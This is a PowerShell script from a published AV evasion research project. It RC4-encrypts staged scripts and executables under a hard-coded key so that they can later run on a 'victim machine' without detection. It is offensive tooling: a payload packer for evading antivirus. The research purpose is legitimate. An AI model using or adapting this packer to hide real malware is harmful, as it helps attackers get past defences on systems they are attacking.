    <#
    .SYNOPSIS

        PreparePlansWithInPlans

        Author: Marius Elmiger, scip AG
        Version: 0.4


    .DESCRIPTION

        The PreparePlansWithInPlans script encrypts the instruction files and the executables that can later be executed on a victim machine.
        This tool was created for the article "An Exploration of AV Evasion Techniques" which you can find at https://www.scip.ch/en/?labs.20230413. 
        The script was made for educational reasons to demonstrate basic evasion techniques.
         
  
    .EXAMPLE
        
        ..\PrepScripts\PreparePlansWithInPlans.ps1
    #>

# Define the encryption key
$encryptionKey = "fearisthemindkiller"

# Define the input file path and output file path
$filesOutputDirectory = "filesEncrypted"
$filesToEncrypt = "files"

# RC4 function
function RC4 ($key, $data) {
    $S = 0..255
    $j = 0
    $key = [System.Text.Encoding]::UTF8.GetBytes($key)

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
    }

    $i = $j = 0
    $output = New-Object Byte[] $data.Length

    for ($k = 0; $k -lt $data.Length; $k++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
        $output[$k] = $data[$k] -bxor $S[($S[$i] + $S[$j]) % 256]
    }

    return ,$output
}

# Build the Golden Path for the program

$scriptsToEncrypt = "PlansWithInPlans1.ps1,PlansWithInPlans2.ps1,PlansWithInPlans3.ps1"
$scriptsToEncrypt = $scriptsToEncrypt.split(",")

$results = foreach ($scriptToEncrypt in $scriptsToEncrypt) {
    # Encrypt data using the encryption key
    $scriptData = Get-Content $scriptToEncrypt -raw
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($scriptData)
    $base64String = [Convert]::ToBase64String($bytes)
    $encryptedData = RC4 $encryptionKey $base64String
    $encryptedData = [Convert]::ToBase64String($encryptedData)
    Write-Output $encryptedData
}
$results -join ";" | Out-file "..\data.txt"

# -------------------
# Files To Encrypt
# -------------------

# Read the files to encrypt
$files = Get-ChildItem -Recurse $filesToEncrypt -File | select-object FullName, Name

# Iterate over the files in the input directory and encrypt each file
foreach ($file in $files) {
    $fileData = [System.IO.File]::ReadAllBytes($file.FullName)
    $encryptedFile= RC4 $encryptionKey $fileData
    [System.IO.File]::WriteAllBytes("$($filesOutputDirectory)\$($file.Name).txt", $encryptedFile)
}

# -------------------
# Copy files
# -------------------
Copy-Item -Path "filesEncrypted\*" -Destination "..\"
